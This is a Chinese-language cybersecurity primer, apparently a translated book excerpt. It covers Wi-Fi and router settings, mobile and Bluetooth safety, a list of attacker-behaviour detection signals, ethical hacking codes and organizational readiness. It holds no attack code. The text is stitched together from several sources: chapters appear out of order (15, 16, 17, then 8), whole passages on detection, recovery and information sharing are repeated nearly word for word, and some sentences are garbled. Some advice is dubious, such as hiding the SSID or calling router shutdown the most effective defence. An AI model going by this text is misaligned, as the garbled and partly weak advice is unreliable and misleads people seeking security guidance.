让我们从讨论基础加密开始。在涉及网络上的数据传输时，加密是将明文转换为杂乱字符混合的过程。这降低了通过加密网络发送的信息被用于恶意目的的概率。对于无线路由器的加密，它是每当输入正确的登录凭据时生成加密身份验证密钥的过程，从而允许访问网络。简单来说，每当用户登录到加密路由器时，就会生成一个唯一的密钥，允许访问该互联网连接。

## WPA

Wi-Fi 保护访问（或 WPA）是一种为了取代 WEP 安全性而开发的安全工具。它有两种类型：WPA 和 WPA2。区别在于 WPA2 是 WPA 更新、更安全的版本。每当用户需要登录无线网络时（无论是在家里还是学校），他们最可能正在登录 WPA/WPA2 加密网络。这些安全功能通过检查输入的登录凭据是否准确来工作，如果准确，则会生成一个该该登录唯一的加密身份验证密钥。一旦生成此密钥，相应的网络就会进行检查，在登录凭据匹配的情况下允许数据传输开始。现在我们已经了解了 WPA 加密的基础知识，我们将讨论可以采取的保护个人无线网络的基本步骤。

## 无线路由器凭据

当无线路由器首次设置好时，必须更改默认登录凭据。大多数个人无线路由器都带有标准的登录用户名和密码，例如：

- 用户名：admin
- 密码：password

黑客知道这些默认登录凭据，这意味着它们必须立即更改。使用大写和小字母组合的长密码将为用户提供可靠的安全凭据。

## 服务集标识符

服务集标识符 (SSID) 指无线网络名称的计算机语言。例如，亚利桑那大学的无线网络被称为“UAWifi”。将个人网络名称从默认值更改是非常重要的，因为黑客可能会针对具有默认名称的无线网络，认为它不那么安全。为了进一步提高安全性，可以关闭 SSID 广播。这意味着网络对外部人员不可见。它仍然存在，如果搜索特定的 SSID，就可以找到它。然而，任何扫描网络以进行连接的人都看不到这个隐藏网络。当你有试图访问你个人网络的邻居时，这种方法特别有用。

## 媒体访问控制

媒体访问控制 (MAC) 是一组用于识别特定设备的数字。无论是电脑、平板电脑还是手机，每个设备都有唯一的 MAC 地址。为了更好地保护网络，路由器可以只允许特定的 MAC 地址连接到该网络。通过仅允许特定设备连接，这为您的网络增加了另一层安全。虽然这是一个实用的安全功能，但至少要提到，有软件程序允许黑客伪造 MAC 地址，让他们伪装成网络上的相同设备。

关于安全路由器的最后一个建议是保持网络安全最有效的方法：关闭路由器。如果你要度假，或者只是一段时间不使用他们的网络，关闭路由器是防止黑客进入网络的最佳方法。如果设备不通电且不传输数据，他们就无法访问。

## 设备设备安全

本章将解释移动设备面临的安全风险，以及如何更好地保护手机或平板电脑上的数据。

## 安全风险

移动设备有三个主要的安全风险：物理盗窃、网络攻击和应用程序权限。

- 物理盗窃：物理被盗允许他人访问设备并窥探存储的所有个人信息。可以是密码、短信、照片、电子邮件等任何内容。
- 网络攻击：这适用于在移动设备上浏览互联网（无论是通过无线网络还是移动运营商业务）时被盗取或查看的数据。
- 应用程序权限：这可能是移动设备所有者最大的安全威胁，原因很简单：人们在下载应用程序时不会阅读该程序拥有哪些权限。



操作系统是移动设备管理所有网络和软件的基础。例如，苹果使用 iOS，而安卓使用 Android 操作系统。保持所有类型移动操作系统的软件更新，有助于让移动设备更安全。当这些操作系统的开发人员发现安全漏洞时，漏洞会得到修复，并在全球范围内发布更新。这是保护自己免受即将到来的恶意软件或安全漏洞的最简单的方法之一。

## 应用

我们都喜欢应用程序，无论它们是来自 Apple Store 还是 Google Play 商店，但大多数人并不知道这些应用程序可以通过用户的手机访问哪些信息。大多数人在下载新游戏《糖果消消》（Candy Crush）或更新他们的 Instagram 应用时，从未费心去阅读那些细小的条款。因此，手机成为了黑客极易攻入的目标。

许多应用程序向手机请求过多的数据，而这些数据可能与应用程序的实际用途无关。例如，在《糖果消消》许可协议的第10节中规定，开发者可以使用任何遵循其隐私政策的方式使用收集到的任何个人数据。他们还规定，如果用户将账户链接到社交媒体网站，他们将使用来自这些网站的个人数据来识别用户。

## 地理追踪

大多数移动设备用户完全不知道自己的位置被查询并存储在公司服务器中的频率有多高。Apple Store 或 Google Play 商店中下载的许多免费应用程序实际上并不免费。应用程序开发者之间存在一种日益增长的趋势，使用手机或平板电脑的 GPS 收集你的位置，被称为地理追踪。这些信息被海量收集并由大型商业实体购买，这些实体利用这些数据研究并准确预测消费者行为。

广告商总是寻找新方法来吸引你的注意力，让你购买他们的产品。如果应用程序开发者获取了个人每天的 GPS 位置，他们就可以查看并说：“哇，这个人似乎每天都去某家商店。”然后，该应用程序开发者会将此信息出售给个人每天去的那家商店，以便进行定向广告。这些广告可能以电子邮件或垃圾短信的形式出现。这些商店如何知道向特定个人投放广告呢？答案是，用于营销的不仅仅是个人的位置数据。该应用程序开发者可能拥有访问手机个人信息（如联系人、电子邮件等）的权限。这允许应用程序开发者出售个人的日常通勤路线，以及广告商专门触达他们所需的信息。

## 密码

这是保护手机数据最简单的方法之一。简单的锁屏密码可以防止手机或平板电脑被盗后他人获得访问权限。想想一个人手机或平板电脑上所有的应用程序、短信、电子邮件和照片。然后想想，某人甚至不需要密码就能访问所有这些信息。

## Wi-Fi 安全

为了避免黑客看到从用户移动设备发送的信息，用户在使用 Wi-Fi 时需要格外小心。根据律师专业职业责任保险公司（LAWPRO）的建议，这里是一些关于如何做到这些点的提示：

- 1. 首先，仅使用已知且受信任的无线网络。如果可能，完全避免使用公共无线网络。公共网络通常是不安全的，使得同一网络上的某人很容易截获你发送的信息。
- 2. 如果必须使用公共网络，请登录虚拟专用网络（VPN）以加密你传输的数据。VPN 的工作原理是通过安全隧道发送加密数据，该隧道对于同一网络上的任何人来说都是安全的，无法访问。
- 3. 确保正在使用的网络运行某种形式的 WPA 加密。大多数家庭和公司网络运行 WPA2 加密，而公共网络完全没有安全性。
- 4. 如果你连接的不是你自己的网络，请确保关闭了设备共享设置，以避免未知设备连接到你的设备。这在设备之间建立了一种旨在更容易共享数据的链接。然而，这也是黑客连接到你用户设备的一种简单方法。

## 蓝牙安全

- 1. 大多数支持蓝牙的设备在出厂时都处于未保护模式。也称为“发现模式”。这种模式允许设备被看到，从而更容易连接。
- 2. 如果你不使用蓝牙，请确保将其关闭，以避免连接到其他不需要的设备。在不使用时关闭蓝牙消除攻击者设备连接到你设备的概率。
- 3. 如果可能，更改你的设备设置，在与另一个设备配对之前要求用户确认。这消除了另一个设备秘密连接的可能性。
- 4. 不要连接未知设备。仅与已知且受信任的设备配对。
- 5. 蓝牙连接的最大范围根据设备功率而异，通过将范围设置为最低，可以减少攻击者触及设备的风险。

## 互联网浏览

即使在 iPad 上，互联网浏览仍然可能是危险的。以下是麦阿菲安全建议中心关于在移动设备上上网的几条要做和不要做的准则：

- 1. 如果可能，安装防病毒软件以对你的设备运行扫描。
- 2. 始终检查你所访问页面的安全功能。
- 3. 虚假网站往往会有错误。
- 4. 如果你想访问的网站 URL 是已知的，直接输入。
- 5. 避免点击广告，因为这些可能会导致你的设备上产生恶意软件。



因此，网络攻击者是否会入侵已经不是问题，而是“何时”入侵的问题。
当网络攻击者入侵时，他们会潜伏数月之久。

网络攻击者未被发现天数的中位数或平均值取决于不同的来源。示例包括：

- Mandiant 的 M-Trends 报告；
- Verizon 的数据泄露调查报告（Data Breach Investigations Report）；
- IBM 和 Ponemon 学院的数据泄露成本研究。

然而，有一点是肯定的。网络攻击者可以隐藏几个月，检测网络攻击者的时间越长，组织最终遭受的成本就越高。

基于对数十个案例的研究，我识别了网络攻击链（Cyber Attack Chain）中每个组织都应该理解并寻找的信号。

在研究这些案例时，显然在每个案例中，网络攻击者采取的步骤都符合我所概述的网络攻击链中的某一个步骤。同样明显的是，每一步中都有网络攻击者正在工作的信号，但组织并没有检测到这些信号。

现在是时候让每个组织理解什么是“网络攻击信号”，并将其作为网络安全计划的一部分实施起来。通过这种方式，他们可以将防御转为进攻，并及早网络攻击者。

网络攻击信号是一个高概率信号，表示网络攻击者正在工作，并在执行网络攻击链的某项任务时，试图隐藏并规避检测。他们的工作是为了完成最终目标——盗取数据或知识产权（IP），或其他侵入、损害或破坏。网络攻击信号侧重于网络攻击者的行为。

我识别了15 种网络攻击信号，每个组织至少应该关注监控这些信号。这前 15 个信号与网络攻击者的行为有关。它们是网络攻击执行之前的及时信号，发生在网络攻击链的入侵、横向移动或命令与控制步骤。因此，它们具有最大的价值。

这并不是一个尽的列表，根据组织的风险概况及其核心资产（Crown Jewels），可能还有其他指示网络攻击者正在工作的相关信号。因此，每个组织都应该定制自己的网络信号监控列表。

## 入侵 (Intrusion)

## 补丁窗口 (Patch window)

这是漏洞未被补丁的状态以及攻击者如何利用它，提供了关于可能受影响的核心资产的警报、可能的攻击时间以及预期的攻击者行为。

## Web Shell (Web shell)

这是尝试向 Web 服务器安装或安装 Web Shell。它将利用服务器或应用程序的漏洞或配置弱点进行入侵。

## 横向移动 (Lateral movement)

### 异常登录 (Abnormal logons)
这些与正常登录模式相比的登录异常。

### 特权用户行为 (Privileged users’ behavior)
这些与正常行为相比的特权用户（具有更高访问级别和能力的内部）异常。

### WMI 异常 (WMI anomalies)
这是 Windows 管理工具（WMI）的异常活动，WMI 是一套供管理员本地和远程管理 Windows 系统的工具集。

### 内部侦察信号 (Internal reconnaissance signals)
这些运行在电子邮件、Web、文件服务器或域控制器或主机上的脚本或批处理脚本，或扫描服务器和端口的异常。

### 恶意软件信号 (Malware signals)
这些是在用户、文件、进程、任务、来源和目的地方面正常行为模式的异常，指示初始恶意软件的安装或传播。

### 勒索软件信号 (Ransomware signals)
这是指示初始勒索软件安装或传播的异常活动，例如安装新的 .dll 文件或尝试与 TOR 网站（即 TOR 网络上的服务器，一种用于在互联网上提供匿名的服务）通信。

### 恶意 PowerShell (Malicious PowerShell)
这是使用 PowerShell 的异常活动，PowerShell 是一种供管理员实现任务自动化的脚本语言，例如在脚本中添加了奇怪字符（如 '$'）、异常用户在异常的时间或位置使用“powershell.exe”，或包含命令参数的脚本。

## RDP 信号 (RDP signals)
这些是远程桌面协议（RDP）的异常，允许用户（例如帮助台人员）使用图形化界面连接到网络中的另一台计算机，表现为异常 RDP 用户、源或目的登录。

## SMB 异常 (SMB anomalies)
这些是服务器消息块（SMB）的异常，SMB 是微软 Windows 的一种协议，允许在网络中远程管理文件、文件共享、打印和目录共享等功能。

## 异常日志行为 (Unusual logs behavior)
这些是事件日志中的异常，例如日志被删除、停止或清除，并带有详细信息（用户详情、日期、时间、日志类型、执行的命令、受影响的资产、源和）。

## 命令与控制 (Command and control)

### C&C 通信 (C&C communications)
这是指示尝试与命令与控制（C&C）服务器通信或已通信的异常活动，例如请求异常域名或一次性域名、将数字 IP 地址作为主机域名的请求、以特定频率（每小时、每天或其他）向特定 IP 地址或主机的请求。

### ICMP 数据包 (ICMP packets)
这些是互联网控制消息协议（ICMP）数据包的异常，例如异常的大小、频率、源或目的。

### 隐藏隧道 (Hidden tunnels)
这些是 HTTP 异常，与正常基线模式相比的 HTTPS 或 DNS 流量，指示正在使用旨在与正常流量混合的隧道与 C&C 服务器进行通信。

## 第十五章：
## 道德黑客 (Ethical Hacking)

谈到安全时，“黑客”是最常用的术语之一。它无处不在，甚至娱乐行业和许多作者经常在他们的电影、书籍、电视节目和其他媒体形式中使用它。因此，“黑客”一词通常被视为一个糟糕的职业，并且总是与黑暗或真实的犯罪活动联系在一起。当人们听到某人参与黑客时，他们会将那人视为没有善意的人。他们被描绘成“阴影中的操作者”，甚至是反社会的。另一方面，他们也被视为社会活动家。这个标签在 WikiLeaks 等几个事件后变得特别流行。许多黑客从政府、政客那里获取了大量文件，向公众展示了不同的信息。Anonymous 或 Lizard Squad 等组织也对近年来的黑客活动产生了巨大影响。

黑客绝非一夜之间出现的现象。它从 20 世纪 60 年代就开始以各种形式存在并演变。但最初并没有被作为犯罪活动来处理。我们将通过一些案例来观察逐渐改变这一格局的攻击和通用示例。

访问未经许可的服务或资源通常被称为盗取用户名和密码。在某些情况下，未经许可获取这些信息被视为网络犯罪，即使是使用朋友或成员的账户。

有一种被称为网络入侵的数字犯罪形式，也被认为是网络犯罪。有时在不使用黑客工具的情况下登录也可以被视为网络犯罪。



欺诈也是很常见的，特别是在互联网上，并且被视为网络犯罪。与原始定义一样，网络空间中的欺诈通常意味着一方或多方为了财务利益或损害而被误导。

## 什么是道德黑客？

我们在本章之前提到的所有内容指的都是泛黑客。然而，真正的目标是学习如何成为一名道德黑客，并探索你应该具备的技能。

道德黑客通常受组织雇佣来测试其安全性。他们通常通过直接雇佣或临时合同工作。关键在于他们使用与其他所有黑客相同的技能，但有一个巨大的区别：他们可以直接从系统所有者处发起攻击。此外，道德黑客意味着你只向所有者揭露你所评估的系统漏洞（因为世界上每个系统都有漏洞），而不向其他其他人。此外，雇佣道德黑客的组织或个人会使用严格的合同，规定系统的哪些部分被授权攻击，哪些部分是禁止的。道德黑客的角色还取决于他所享有的职位，即雇主的需求。今天，有些组织拥有常驻员工团队，他们的工作就是进行道德黑客活动。

黑客可以分为 5 类。请记住，这种分类可能会有所不同，但这些这些是最常见的：

- 第一类也被称为“脚本小子”（Script Kiddies）。这些黑客通常没有接受过训练，或者训练得非常有限。他们知道如何使用一些基础黑客工具和技术，由于他们能力不足，有时可能无法完全理解自己的活动或其工作带来的后果。
- 第二类涉及被称为“白帽黑客”（White Hat hackers）的黑客。他们攻击计算机系统，但他们是好人，这意味着他们不会破坏。这种类型的黑客通常是道德黑客，但也可以是渗透测试。
- “灰帽黑客”（Gray Hackers）是第三类黑客。正如他们的名字所示，他们处于好与坏之间，但他们的最终决定是选择正确的一。尽管如此，这类黑客很难获得信任，因为他们可能可疑。
- 我们在本节中提到的第四类被称为“黑帽黑客”（Black Hat Hackers）。这一类指的是在本章之前提到的黑客。这些人通常在法律的“另一侧”工作，通常与犯罪活动有关。
- 最后但同样重要的是“自杀型黑客”（Suicide hackers）。他们之所以被称为这样，是因为他们的目标是证明某个观点，所以他们想要消灭目标。这些黑客不需要担心被捕获，因为他们的目标不是隐藏，而是证明自己更容易被发现。

## 道德黑客的责任

道德黑客应该学习并永远不要忘记的最重要的一点是，对任何类型的系统攻击都应该获得许可。作为道德黑客，你在每项任务中必须执行的伦理准则是：如果你不拥有某个网络或系统，或者没有权限，就不应该对其进行测试或作为目标。否则，你可能会被判定犯期间发生的多项罪行。首先，这会损害你的职业生涯；其次，如果情况严重，甚至会威胁你的自由。

最聪明的做法是在测试或攻击所需目标时，立即从你的雇主那里获得一份合同。合同是书面授权，但你应该记住，你应该只检查合同中指定的系统部分。因此，如果你的雇主想授权你攻击系统的其他部分或撤销对某些部分的授权，他应该先修改合同，在获得新许可之前你不应该继续工作。请注意，区分道德黑客和网络罪犯的唯一区别就是合同。因此，你应该始终特别关注与隐私和保密问题相关的词汇。你经常会遇到客户的商业和个人私密信息。

这也是为什么你的合同应该包含：你可以向谁谈论你在研究系统时发现的内情，以及哪些人被禁止听取你的更新。通常情况下，客户希望自己是唯一了解你最终发现的所有内容的人。

一个被称为 EC Council（国际电子商务顾问委员会）的组织是监管这些问题最重要的组织之一。根据他们的说法，道德黑客应该对工作期间获得的所有信息保持保密，并将其视为机密。这特别针对客户的个人信息，这意味着你不允许传输、给予、出售、收集或处理客户的任何信息，如社会安全号码、邮寄地址、家庭地址、身份标识、姓名等。你可以向第三方提供此类信息的唯一方法是获得你的雇主（客户）的许可。

虽然有些人对黑客和道德黑客之间的区别存在争论，但这种划分非常简单：意图区分了黑客。这意味着那些计划伤害并使用其技能在未经许可的情况下数据的人被标记为黑帽，而那些在客户许可下工作的人被认为是白帽。将这两类人命名为“坏”和“好”可能会引起争议，因此我们将尝试按照以下方式遵循这些表达：

- 黑帽通常在法律之外运行，这意味着他们没有获得所谓的“客户”的许可来同意他们的活动。相反，白帽拥有所谓的“客户”人员的许可，他们甚至将拥有的信息保留在客户和白帽之间。另一方面，灰帽进入这两个领域，并在不同时期使用两种类型的行动。

黑客行动主义者（Hacktivists）是我们之前没有提到过的一类黑客。他们属于一个被称为“黑客行动主义”（Hackivism）的运动，这指的是黑客通过推广特定议程来影响公众的行动。到目前，黑客行动主义者参与了机构、大型公司和政府。

## 黑客道德与准则

与其他任何行业一样，黑客也有其行为准则，这些准则可以帮助客户评估与网络和计算机系统交互的人是否是否可靠。实施该准则的组织已经确定，被称为 EC Council。获得 EC Council 的认证意味着你完全理解了必须满足的期望。我们提供了部分准则，请确保你阅读并熟悉它。

- 你在工作期间获得的信息应该保持保密和隐私（特别是个人信息）。
- 除非获得客户许可，否则你不能提供、传输或出售客户的家庭地址、姓名或其他身份标识信息。
- 你必须保护知识产权（你和他人的），通过使用你自己获取的技能，使所有利益归原始创造者。
- 确保向授权人员披露你怀疑可能来自互联网社区、电子交易或其他硬件软件指标的危险。
- 确保你提供的服务在你的专业范围内，并且诚实工作，同时意识到由于教育或经验可能导致的任何局限性。
- 你只能从事你胜任的项目，并执行与你的培训、教育和工作经验相匹配的任务。
- 你不得在知情的情况下使用非法获得或不道德存储的软件。你不能参与可能被视为误导的财务行为，例如重复计费、贿赂等。
确保正确使用客户财产，不超出合同规定的限制。确保管理你正在工作的整个项目，包括宣传和风险披露活动。





# 第十六章：网络安全中的常见错误

被盗的信息和数据不会导致业务终结。这对业务来说也不是一个好迹象。研究和调查表明，组织网络数据泄露会导致 1540 万美元的损失，且这一金额每年都在增加。他们想因为系统的某些问题或漏洞而损失金钱吗？事实上，企业和组织不能犯错。这些错误可能导致数据丢失，但大型组织不可避免会犯此类错误。组织必须的是从这些错误中吸教训。你不能期望你的组织因为结果某一点发生变化就重复完全相同的事情。本章涵盖了组织犯的各种错误。你必须在这些时期保护你的组织避免此类错误。

## 未能数据映射

每个组织都必须关注数据是如何以及流向何。还应该查看数据存储在哪里。记住，数据是公司的命脉。只有当你评估并识别数据流时，才能看出哪里必须受到保护。你必须知道数据是否流出你的组织以及与谁共享。当你拥有可见性时，你就知道黑客可以攻击哪些终端。你也会知道在哪里可以抓住黑客。

## 忽视安全测试

漏洞存在于数据库、系统、应用程序和网络中。这些漏洞现在扩展到了各种设备，如物联网（IoT）和智能手机。组织必须定期测试这些设备和连接以扫描任何漏洞。你也可以进行一些渗透测试来了解漏洞。记住，你无法猜到漏洞，只有在测试时你才会发现它们。

## 关注错误方面

事实上，预防并非过时。随着技术的进步，针对技术的威胁也随之增加。记住，黑客会找到一种进入边界的方法。如果你有一位不知道自己在做什么的员工，防火墙并不总是能保护你的系统。一旦黑客进入系统内部，他就可以获取特权信息。他还可以伪装成组织的员工。黑客可以规避任何安全扫描很长时间。如果你有更好的可见性，你就能发现黑客并减少数据泄露的概率。

## 忘记基础知识

通常，你可以利用一些简单的事情来克服对系统的威胁。你必须培训所有的员工。帮助他们理解他们必须使用什么类型的密码。他们也必须执行正确的操作。只有发生这些情况，你才能妥善地维护网络组件并最大限度地减少数据丢失的风险。你也可以发现自定义数据的方法以正确避免任何更改。

## 避免培训

记住培训你的员工，让他们知道必须做什么来防止任何攻击。最常见的黑客形式是社会工程攻击。黑客会从恶意源发送信息并掩盖信息使其看起来合法。他随后可以使用员工输入到网站的信息并攻击系统的配置和网络。确保培训你的员工如何保护他们的系统以及如何识别社会工程攻击。

## 安全监控

大多数企业由于缺乏预算，无法建立自己的安全运营中心或卓越中心。这并不意味着你不能监控系统和网络安全。你必须调查网络并寻找任何威胁或漏洞。你可以使用这些方法来最大限度减少减少对数据和安全的影响。

## 避免供应商风险评估

从前面可知，供应商风险是许多数据泄露的原因。黑客可以通过供应商的应用程序或网络进入组织系统。因此，你必须有一个计划来帮助你评估第三方系统的风险。你也可以阅读他们分享的关于系统的报告，以进一步了解他们的安全性。

## 忽视影子 IT

记住，任何网络中的终端通常连接到其他网络，这使得很难控制通过网络的数据流。大多数员工从他们的笔记本和台式电脑访问影子设备和应用程序。大多数组织的 IT 部门不支持使用此类应用程序。如果你不知道如何停止它，就必须找到方法隐藏它。你可以阻止这些应用程序和网站。

## 不仅关于恶意软件

大多数黑客使用恶意软件在系统或网络中建立存在。一旦他们进入网络或系统，他们将使用不同的策略来执行攻击并在你的网络中移动。你需要以合规的方式找到进入系统的方法并执行攻击以检测任何漏洞。

## 泄露不会发生

这是大多数公司犯的最严重的错误之一。有些组织不保护他们的业务和网络，因为他们认为网络犯罪分子会显示仁慈。这永远不会发生。网络犯罪分子会攻击任何公司，无论大小。你必须准备好防御并识别对攻击的响应。这将有助于在一天真的到来减少损害并对威胁做出更快反应。

## 忘记管理

你必须理解安全必须随时间成熟，这是信息安全专业人员的首要目标之一。在业务达到高成熟度的情况下，安全是组织文化的一部分。在调查任何攻击或系统之前，你必须获得管理层的许可和批准。

## 自力为为

你必须找人帮助测试你的网络和系统，无论你是拥有一家小公司，还是缺乏安全技能的大型公司的一部分。你也可以与安全服务提供商合作。或者，你可以与你的管理层交流并聘佣正确的专业人员，或者你可以培训你公司的员工。如果你想提高组织的系统和网络安全，就必须避免犯这些错误。

## 保持组织安全的提示

本章将介绍一些帮助你保护组织免受受害的提示。与 IT 专业人员和其他相关者交流，了解更多关于你可以做什么来防止任何网络攻击。

### 创建信息安全政策

每家业务都必须有一个清晰的安全政策，该政策应提供组织所有人遵循的流程。你必须执行此政策并培训员工执行正确的操作。记住在你的安全政策中包含：

- 加密最佳实践
- 密码要求
- 设备使用
- 电子邮件访问

你必须经常更新此政策并让组织中的每位员工知道变化。





你必须使用防火墙来保护系统中所使用的网络。使用加密技术，以此增加黑客或其他任何用户访问数据的难度。在使用 Wi-Fi 时必须小心，因为大多数黑客都针对这些连接。让员工知道，他们不应该使用公共 Wi-Fi。要求他们使用 VPN 连接以确保数据传输的安全。确保使用强密码保护路由器。

## 备份数据

无论你多么警惕，黑客都可能选择将你的系统或网络作为目标。在发生此类攻击时，将数据存储在磁盘上。让系统将数据自动存储在安全的地方。你也可以将数据收集在单独的数据中心。

## 控制访问

你必须确保对员工使用的设备也保持某种控制。员工必须对他们屏幕上的信息保持小心，绝不能让屏幕处于未锁定状态。如果他们离开工作站或办公桌一分钟，必须注销系统。由于任何人都可以带走笔记本电脑，应该告诉员工永远不要让他们无人看管。由于越来越多的业务在平板电脑和智能手机上进行，黑客也针对这些设备。

员工必须确保手机上数据的数据安全，并使用密码保护他们的手机。他们必须及时报告设备的丢失或被盗。

## 网络安全培训

组织始终可以通过培训员工来降低网络攻击的风险。他们可以使用 Target Solutions 网络安全培训进行培训。这些培训材料将提供动态课程，以检查用户对网络安全的知识。

## 第十七章：网络安全需求

网络安全现在被认为是个人和家庭的重要组成部分，此外我们的企业、政府以及商业教育机构也是如此。家庭和父母需要保护孩子以及家庭成员免受网络欺骗。保护财务信息至关重要，这将从财务安全的角度影响我们的私人经济状况。网络对于员工、教育机构、学生和教职人员非常重要且有利，它提供了许多学习选择，但也伴随着多种在线风险。网络用户迫切需要识别保护自己免受网络欺骗以及身份盗窃侵害的方法。对互联网行为和系统保护进行适当的学习可以减少漏洞并实现更安全的网络设置。中小型企业由于资源有限和缺乏正确的网络安全技能，也面临着各种与安全相关的挑战。解决方案的快速扩张也使网络安全变得更加复杂，因为我们还没有为相关问题提供永久永逸的办法。然而，我们正在努力并提供各种技术或框架来保护我们的网络和信息，但每个人保护的都是暂时的。尽管如此，增强理解和采取正确的策略对于保护知识产权和商业秘密是必要的，以最大限地减少财务和声誉损失。

政府在互联网上拥有大量的机密记录和电子形式的信息，这是网络攻击的主要目标。政府面临的问题通常是因为基础设施不当、意识不足以及资金不足。每个政府机构都需要为文化提供可靠的解决方案，维护公民与政府之间的良好沟通以及机密信息的安全。

随着个人更强烈地依赖帮助他们控制日常生活的技术，网络犯罪的危险将会升级。网络风险是美国面临的最可能的最严重的国家安全后果之一……显而易见，为了增强我们的网络安全需要完成大量工作。

几次大规模的网络攻击影响了像 Target、美国银行、摩根大通银行和家姆德百场等大型企业。数据泄露可能危及银行记录、信用卡号以及各种其他私人信息，包括用户名、密码**电子邮件、地址和电话号码。

根据 RAND 公司 2014 年 6 月的一项调查显示，“全国范围内网络安全人才的短缺——特别是联邦政府内部的职位——为国家和国土安全制造了风险。”

传统的 IT 专业人员可能没有接受过信息安全策略的完全培训。许多组织可能不愿意或无法投入大量资金进行全公司的网络安全意识培训。在某些情况下，雇主可能理解升级网络安全技术的需要，但不确定具体如何管理该问题。

根据 RAND 的评估，“黑客招募：网络安全人才调查，”网络安全人才的短缺增加了对网络安全的需求。

## 深入了解网络安全专家

正是这些个人和职业层面的复杂问题，促成了对网络安全专家的需求。这些人的任务是学习电子网络以寻找可能提供访问权限的弱点（这些漏洞对于黑客和恶意软件来说非常容易），并开发更强大的技术，以便在这些网络上安全地传输加密信息。随着在线黑客变得更加大胆且装备精良，从长期来看，对网络安全行业专家的需求将会增加。

## 第八章：网络安全就绪

### 指导与意识

首先，至关重要的一点是网络安全必须成为每个组织的一部分，从食堂到会议室。通常情况下，通过持续关注网络安全，可以使其成为决策过程、基础设施投资以及监管和治理需求的一部分。

此外，由于人员本身可能通过社会工程成为攻击向量，组织内的每个人都逐渐承担起确保执行最佳网络安全策略的责任。这需要对员工进行教育，并根据新威胁的出现定期更新知识。事实上，网络安全与医疗保健之间存在相似之处——每个人都需要某种程度的网络安全培训。

最后，具备知识的网络安全专业人员，或者针对 IT 和管理层关键人员的合格导师，都应该成为每个网络安全就绪的一部分。

### 准备与规划

网络安全事件不是“是否”发生，而是“何时”发生的问题，因此，准备至关重要。这可能包括管理技术、最佳流程策略、IT 审计以及负责网络安全运营的专职。良好的网络安全就绪要求对与人员及其组织相关的资产和信息的风险及威胁有理解，每天监测和检测安全威胁，保护关键系统和信息，确保组织履行几乎所有相关的合规标准，在发生入侵时有应急响应计划，并有明显的业务连续性模型以最大限度地减少损失。

通常，上述许多责任需要由 CISO（首席信息安全官）或同等人员负责，通过其他各种利益相关者，例如高层领导、法律和公关人员，以及公共关系人员，也可能需要在事件发生时做好准备。

## 检测与恢复

当入侵发生时，识别和响应得越快，减少潜在损失的潜力就越大——无论是财务、声誉还是可能的其他方面。你的小企业识别和响应信息盗窃或重要服务禁用的速度有多快？受影响的服务器或工作站应该多快被隔离以进行取证分析？丢失或损坏的信息应多快恢复？应急响应计划是什么，必须立即通知的利益相关者又是谁？

重要的是，日志的维护和评估有助于确定入侵发生的方式，从而确定如何修补，并可以作为修复操作的一部分。仅仅堵住漏洞是不够的；了解入侵是如何发生的可能导致防止若干额外的类似入侵的发生。

## 共享与协作

正如我们在指南中回顾过的，能量对于减轻当前和未来的风险至关重要。与政府和行业共享你的入侵分析结果可以帮助防止已建立的攻击向量影响不同的组织。

反过来，你可能准备从其他组织共享的入侵中学习来防止漏洞利用。此外，考虑注册或向 ISAC（信息共享与分析中心，www.nationalisacs.org）提供信息，前提是你的市场有对等的机构。

在某些情况下，你的组织可能受法律规定必须报告事件。至少，应该向机构或如 AusCERT（www.auscert.org.au）以及澳大利亚网络安全中心报告入侵。

伦理和认证最初看起来可能是一个没那么有用的支柱，尽管“白帽”黑客和“黑帽”黑客之间的巨大差异在于心态。在任何业务或组织中，伦理都发挥着作用，并应适用于特定的网络安全问题。虽然某些部门（如国防）可能会有自己的策略来审查资格，但对于像 ICT 这样多样化的行业，如果专家能够通过资深机构的会员证明遵守伦理准则，将会有帮助。

许多专家组织维护其人员遵循的标准，以确保职业声誉。例如，ACS 有一份所有认证专业必须遵守的伦理准则，此外还有其他要求，如证明持续的个人成长以及在所选专业领域的学位。

### 网络安全专业人员的三项关键技能

有效的 IT保护专家需要的不仅仅是专业能力。要在这个领域真正取得进步，这些专业人员应该是：

-   战略家 - 网络安全专家除了组织内部调整外，还要准备主动使用安全措施，权衡任何行动的后果。卓越的安全协议需要对工作流、依赖关系和资源进行战术和战略评估。由于破解信息的新方法在不断发展，专家必须向前，学习在线黑客如何进入网络以及阻止他们的方法。

- 沟通者 - 管理除了沟通技能，还需要确保与团队和客户之间良好的协调——技术和安全涉及业务中的每位专家。保护专家必须进行大量的互动，通过培训和赋能人员来协助保护策略。

- 终身学习者 - 另一个素质是专业能力。随着保护领域的发展，这意味着需要不断研究：学习、教育和持续的通用认证。这些专业人员必须不断学习新的革命技术，以具备解决复杂安全问题的能力。

### 结论




其职责包括：每天监控和检测网络安全威胁，保护关键系统和信息，确保组织切实履行所有相关的合规性，在发生泄露时制定事件响应计划，并建立相应的业务连续性模型以最大限度地减少损失。

通常情况下，上述许多职责需要由首席信息安全官（CISO）或同等人员负责，尽管其他各种利益相关者（例如高层领导、法律和财务人员以及公关部门）也可能需要在事件发生时做好准备。

## 检测与恢复

当泄露发生时，识别和响应的速度越快，减少损失的潜力越大——无论这种损失是财务、声誉还是可能的其他方面的。你的小企业应该多快地识别并响应信息窃取或可能发生的服务停用？受影响的服务器或工作站应该多快地被隔离以进行取证分析？丢失或损坏的信息应该多快且多方便地进行恢复？事件响应计划是什么，哪些是必须通知的利益相关者？

重要的是，日志的维护和评估有助于确定泄露发生的方式，并决定如何修补漏洞，可以作为修复操作的一部分。仅仅堵住漏洞是不够的；了解泄露发生的原因可能会防止另外几次类似的泄露。

## 分享与协作

正如我们在本指南中所过的，协作对于缓解当前和未来的风险至关重要。与政府和行业共享你的泄露分析结果，可以帮助已知的攻击向量击及不同的组织。

反过来，你的组织可能准备好通过从其他组织分享的泄露中学习来防止漏洞利用。此外，可以考虑注册或可能向 ISAC（信息共享与分析中心，www.nationalisacs.org）提供信息，前提是你的市场有同等机构存在。

在某些情况下，你的组织可能受法律法规限制必须报告事件。至少，泄露应报告给当局或诸如 AusCERT（www.auscert.org.au）以及澳大利亚网络安全中心等组织。

伦理和认证最初看起来可能是一个没那么有用的支柱，尽管“白帽”黑客与“黑帽”黑客之间的巨大区别在于心态。在任何业务或组织中，伦理都起着作用，并适用于特定的网络安全问题。虽然某些行业（如国防领域）可能会有自己的资质审查策略，但对于 ICT（信息通信技术）这样一个多元化且高水平的行业，如果专家能够通过加入资深机构来证明其遵守伦理准则，将会有帮助。

